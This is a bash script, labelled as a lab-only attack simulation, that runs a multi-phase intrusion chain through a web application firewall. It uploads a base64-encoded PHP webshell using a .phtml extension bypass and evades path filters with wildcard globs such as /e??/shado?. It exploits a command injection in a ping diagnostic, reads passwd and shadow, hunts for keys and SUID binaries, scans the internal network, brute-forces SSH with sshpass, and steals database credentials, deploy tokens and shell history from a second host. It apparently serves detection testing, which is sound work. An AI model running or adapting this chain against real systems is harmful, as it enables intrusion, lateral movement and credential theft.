#!/bin/bash
# ============================================================
# Web Penetration → Lateral SSH Brute-force — WAF Variant
# (Web 挂马 → 横向 SSH 爆破 — 域名版, 经 WAF)
#
# WARNING: Lab-only attack simulation script.
#          Do NOT run against unauthorized targets.
#
# Prerequisites:
#   - Target web app deployed (deploy-web.sh on host 91)
#   - SSH weak-password target deployed (deploy-ssh-target.sh on host 92)
#   - WAF domain reachable with valid SSO session cookie
#   - Tools: curl, sshpass, nmap (on target host)
#
# Usage:
#   export WAF_DOMAIN="https://your-waf-domain:port"
#   export WISID_COOKIE="WISID=<your-session-id>"
#   bash attack-domain-waf.sh
#
# Differences from attack.sh (direct IP version):
#   - All requests routed through WAF: -sk -b "$COOKIE"
#   - WAF blocks /etc/passwd literal → wildcard /e??/passw? bypass
#   - WAF blocks .php upload → .phtml bypass (same as direct version)
#   - WAF blocks cat /etc/shadow → wildcard cat /e??/shado? bypass
#
# Covered scenarios: S2 (WebShell), S5 (host anomaly),
#                    S6 (SSH brute-force), S7 (credential theft)
# Targets: 91 (Web+WebShell) → 92 (SSH weak password + sensitive data)
# ============================================================

set +e

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/lab-safety.sh"

# ---------- Configuration (override via environment variables) ----------
DOMAIN="${WAF_DOMAIN:-https://waf.lab.example:30443}"
# Authentication is optional for an unprotected lab WAF; when configured, pass
# the operator-provided cookie unchanged to every request.
COOKIE="${WISID_COOKIE:-}"
BASE="${DOMAIN}"
P="/webshell"

TARGET_IP="${SSH_TARGET_IP:-10.66.6.92}"
TARGET_USER="${SSH_TARGET_USER:-devops}"
TARGET_PASS="${SSH_TARGET_PASS:-devops123}"

lab_require_attack_target "${DOMAIN}" || exit $?
lab_require_attack_target "${TARGET_IP}" || exit $?
WEBSHELL_NAME="s.phtml"
BRUTE_DELAY=1

PASSWORDS=(admin password 123456 root letmein password123 12345678 qwerty admin123 test devops ubuntu centos "$TARGET_PASS")

SCAN_PATHS=(/admin /wp-admin /wp-login.php /phpmyadmin /.git/config /.env /backup.sql /manager/html /actuator /api/v1/users /console /server-status /test.php /config.php /shell.php /info.php /xmlrpc.php /.htaccess /wp-config.php.bak /database.sql)

# ---------- Utility functions ----------
SHELL_CMD() {
    curl -sk -b "$COOKIE" "${BASE}${P}/uploads/${WEBSHELL_NAME}?c=$1"
}
SHELL_CMD_TIMEOUT() {
    curl -sk -b "$COOKIE" --max-time "$1" "${BASE}${P}/uploads/${WEBSHELL_NAME}?c=$2"
}
HTTP() {
    curl -sk -b "$COOKIE" -o /dev/null -w '%{http_code}' "$@"
}

get_cst() {
    curl -sk -b "$COOKIE" "${BASE}/cmdi/diag.php?tool=ping&host=127.0.0.1;date" 2>/dev/null \
        | grep -oE '[A-Z][a-z]{2} +[A-Z][a-z]{2} +[0-9]+ [0-9]{2}:[0-9]{2}:[0-9]{2} [A-Z]+ [0-9]{4}'
}

log()  { echo -e "\033[1;34m[*]\033[0m $*"; }
ok()   { echo -e "\033[1;32m[+]\033[0m $*"; }
fail() { echo -e "\033[1;31m[-]\033[0m $*"; }
hdr()  { echo -e "\n\033[1;33m========== $* ==========\033[0m"; }
ts()   { local t=$(get_cst); echo -e "\033[0;36m[$t]\033[0m $*"; }

# ---------- PHASE 1: Pre-attack normal traffic ----------
phase1_normal_traffic() {
    hdr "PHASE 1: Pre-attack Normal Traffic"

    local -a UAS=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
        "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
    )

    for ua in "${UAS[@]}"; do
        HTTP -H "User-Agent: $ua" "${BASE}${P}/"
    done
    HTTP -H "User-Agent: ${UAS[1]}" "${BASE}${P}/index.php"
    HTTP -H "User-Agent: ${UAS[0]}" "${BASE}${P}/uploads/"
    HTTP -H "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)" "${BASE}/robots.txt"
    HTTP "${BASE}/favicon.ico"

    echo 'meeting notes content' > /tmp/_attack_notes.txt
    curl -sk -b "$COOKIE" -o /dev/null -F "file=@/tmp/_attack_notes.txt;type=text/plain" \
         -H "User-Agent: ${UAS[0]}" "${BASE}${P}/upload.php"
    HTTP -H "User-Agent: ${UAS[0]}" "${BASE}${P}/uploads/_attack_notes.txt"

    ts "P1 normal traffic complete (11 requests)"
}

# ---------- PHASE 2: Reconnaissance scan ----------
phase2_recon_scan() {
    hdr "PHASE 2: Reconnaissance Scan"

    local count=0
    for path in "${SCAN_PATHS[@]}"; do
        HTTP -H "User-Agent: Mozilla/5.0 zgrab/0.x" "${BASE}${path}"
        ((count++))
    done

    HTTP -H "User-Agent: Mozilla/5.0 Chrome/126.0" "${BASE}${P}/"
    HTTP -H "User-Agent: Mozilla/5.0 (iPhone) Safari/604.1" "${BASE}${P}/index.php"

    ts "P2 recon complete ($count paths)"
}

# ---------- PHASE 3: WebShell upload ----------
phase3_upload_webshell() {
    hdr "PHASE 3: WebShell Upload"

    log "Attempting .php upload (expect WAF block)"
    echo '<?php phpinfo();?>' > /tmp/_attack_test.php
    local code
    code=$(curl -sk -b "$COOKIE" -o /dev/null -w '%{http_code}' \
         -F "file=@/tmp/_attack_test.php;type=image/jpeg" "${BASE}${P}/upload.php")
    log ".php upload returned: $code (expect 403 WAF block)"

    log "Uploading ${WEBSHELL_NAME} (.phtml WAF bypass)"
    echo 'PD9waHAgZWNobyAiPHByZT4iLnNoZWxsX2V4ZWMoJF9HRVRbImMiXSkuIjwvcHJlPiI7ID8+' \
        | base64 -d > "/tmp/_attack_${WEBSHELL_NAME}"
    code=$(curl -sk -b "$COOKIE" -o /dev/null -w '%{http_code}' \
         -F "file=@/tmp/_attack_${WEBSHELL_NAME};filename=${WEBSHELL_NAME};type=image/jpeg" "${BASE}${P}/upload.php")
    log ".phtml upload returned: $code (WAF file-type check bypassed)"

    log "Verifying WebShell"
    local result
    result=$(SHELL_CMD "id")
    if echo "$result" | grep -q "nginx\|www-data\|apache"; then
        ok "WebShell active: $result"
    else
        fail "WebShell verification failed: $result"; exit 1
    fi

    ts "P3 WebShell upload + verification complete"
}

# ---------- PHASE 4: RCE reconnaissance ----------
phase4_rce_recon() {
    hdr "PHASE 4: RCE Reconnaissance"

    # WAF bypass: /etc/passwd → /e??/passw?, /etc/shadow → /e??/shado?
    local -a cmds=(
        "whoami"
        "id"
        "uname+-a"
        "cat+/e??/os-releas?+|+head+-3"
        "hostname"
        "cat+/e??/passw?"
        "cat+/e??/shado?+2>%261"
        "/sbin/ip+addr+2>%261"
        "/sbin/ip+route+2>%261"
        "ps+aux+--sort=-%25cpu+|+head+-10"
    )

    for cmd in "${cmds[@]}"; do
        SHELL_CMD "$cmd" | head -5
    done

    ts "P4 RCE recon complete (${#cmds[@]} commands, wildcard WAF bypass)"
}

# ---------- PHASE 5: Credential search + privilege escalation + network discovery ----------
phase5_privesc_discovery() {
    hdr "PHASE 5: Credential Search / Privilege Escalation / Network Discovery"

    log "Sensitive file search"
    SHELL_CMD "find+/+-name+*.key+-o+-name+*.pem+2>/dev/null+|+head+-10"
    SHELL_CMD "grep+-r+password+/etc/nginx/+2>/dev/null"
    SHELL_CMD "cat+/var/www/html/webshell/upload.php"

    log "Privilege escalation attempt"
    SHELL_CMD "sudo+-l+2>%261"
    SHELL_CMD "find+/usr/bin+-perm+-4000+-type+f+2>/dev/null"

    log "Internal network discovery"
    SHELL_CMD "/sbin/ip+route+2>%261"
    SHELL_CMD "ping+-c2+-W1+${TARGET_IP}+2>%261"
    SHELL_CMD "/usr/bin/nmap+-Pn+-sT+-p22,80,443,3306,8080+${TARGET_IP}+2>%261"

    HTTP -H "User-Agent: Mozilla/5.0 Chrome/126.0" "${BASE}${P}/"
    HTTP -H "User-Agent: Mozilla/5.0 Firefox/128.0" "${BASE}${P}/uploads/"

    ts "P5 network discovery complete (${TARGET_IP}:22 open)"
}

# ---------- PHASE 6: SSH brute-force ----------
phase6_ssh_bruteforce() {
    hdr "PHASE 6: SSH Brute-force"

    local dict_cmd="printf+"
    for pw in "${PASSWORDS[@]}"; do
        dict_cmd+="${pw}%5Cn"
    done
    dict_cmd+="+>+/tmp/pass.txt"
    SHELL_CMD "$dict_cmd" > /dev/null

    log "Starting brute-force ${TARGET_USER}@${TARGET_IP} (${#PASSWORDS[@]} passwords)"

    local ssh_opts="ssh+-o+ConnectTimeout%3D5+-o+StrictHostKeyChecking%3Dno+-o+UserKnownHostsFile%3D/dev/null"

    for pw in "${PASSWORDS[@]}"; do
        local cmd="sshpass+-p+${pw}+${ssh_opts}+${TARGET_USER}@${TARGET_IP}+echo+AUTH_SUCCESS"
        local result
        result=$(SHELL_CMD_TIMEOUT 10 "$cmd")

        if echo "$result" | grep -q "AUTH_SUCCESS"; then
            ok "Password hit: $pw"
        else
            fail "Failed: $pw"
        fi
        sleep "$BRUTE_DELAY"
    done

    ts "P6 SSH brute-force complete"
}

# ---------- PHASE 7: Lateral movement + data theft ----------
phase7_lateral_movement() {
    hdr "PHASE 7: Lateral Movement + Data Theft"

    local ssh_prefix="sshpass+-p+${TARGET_PASS}+ssh+-o+StrictHostKeyChecking%3Dno+-o+UserKnownHostsFile%3D/dev/null+${TARGET_USER}@${TARGET_IP}"

    log "System reconnaissance"
    SHELL_CMD "${ssh_prefix}+id"
    SHELL_CMD "${ssh_prefix}+uname+-a"
    SHELL_CMD "${ssh_prefix}+hostname"
    SHELL_CMD "${ssh_prefix}+/sbin/ip+addr"

    log "Stealing sensitive files"
    echo "--- db-credentials.conf ---"
    SHELL_CMD "${ssh_prefix}+cat+/home/${TARGET_USER}/projects/db-credentials.conf"
    echo "--- deploy-token.json ---"
    SHELL_CMD "${ssh_prefix}+cat+/home/${TARGET_USER}/.config/deploy-token.json"
    echo "--- .bash_history ---"
    SHELL_CMD "${ssh_prefix}+cat+/home/${TARGET_USER}/.bash_history"

    log "Privilege escalation attempt"
    SHELL_CMD "${ssh_prefix}+sudo+-l+2>%261"
    SHELL_CMD "${ssh_prefix}+cat+/e??/shado?+2>%261"
    SHELL_CMD "${ssh_prefix}+find+/usr/bin+-perm+-4000+-type+f+2>/dev/null"

    ts "P7 lateral movement + data theft complete"
}

# ---------- PHASE 8: Post-attack normal traffic ----------
phase8_post_normal() {
    hdr "PHASE 8: Post-attack Normal Traffic"

    HTTP -H "User-Agent: Mozilla/5.0 Chrome/126.0" "${BASE}${P}/"
    HTTP -H "User-Agent: Mozilla/5.0 Safari/605.1" "${BASE}${P}/index.php"
    HTTP -H "User-Agent: Mozilla/5.0 Chrome/126.0" "${BASE}${P}/uploads/"
    HTTP -H "User-Agent: Mozilla/5.0 Firefox/128.0" "${BASE}${P}/"
    echo 'weekly report' > /tmp/_attack_report.txt
    curl -sk -b "$COOKIE" -o /dev/null -F "file=@/tmp/_attack_report.txt;filename=weekly-report.txt;type=text/plain" \
         -H "User-Agent: Mozilla/5.0 Chrome/126.0" "${BASE}${P}/upload.php"
    HTTP -H "User-Agent: Mozilla/5.0 (iPhone) Safari/604.1" "${BASE}${P}/"
    HTTP "${BASE}/favicon.ico"

    ts "P8 normal traffic complete"
}

# ---------- Main ----------
main() {
    trap 'rm -f /tmp/_attack_* 2>/dev/null' EXIT

    echo ""
    echo "  ╔══════════════════════════════════════════════════╗"
    echo "  ║  Web Penetration → Lateral SSH (WAF Variant)    ║"
    echo "  ║  Target: ${DOMAIN}                              ║"
    echo "  ╚══════════════════════════════════════════════════╝"
    echo ""

    hdr "Connectivity Check"
    local code
    code=$(HTTP "${BASE}${P}/")
    if [ "$code" = "200" ]; then
        ok "Web target reachable (HTTP $code)"
    elif [ "$code" = "302" ]; then
        fail "Cookie may have expired (302 redirect to SSO)"
        fail "Update WISID_COOKIE: export WISID_COOKIE='WISID=new-value'"
        exit 1
    else
        fail "Web target unreachable (HTTP $code)"; exit 1
    fi

    ts "=== Attack Start ==="

    phase1_normal_traffic
    phase2_recon_scan
    phase3_upload_webshell
    phase4_rce_recon
    phase5_privesc_discovery
    phase6_ssh_bruteforce
    phase7_lateral_movement
    phase8_post_normal

    ts "=== Attack End ==="

    echo ""
    hdr "Attack Chain Complete"
    ok "Path: Normal traffic → Recon → WebShell(.phtml WAF bypass) → RCE(wildcard WAF bypass) → Network discovery → SSH brute-force → Lateral movement → Data theft"
    echo ""
}

main "$@"
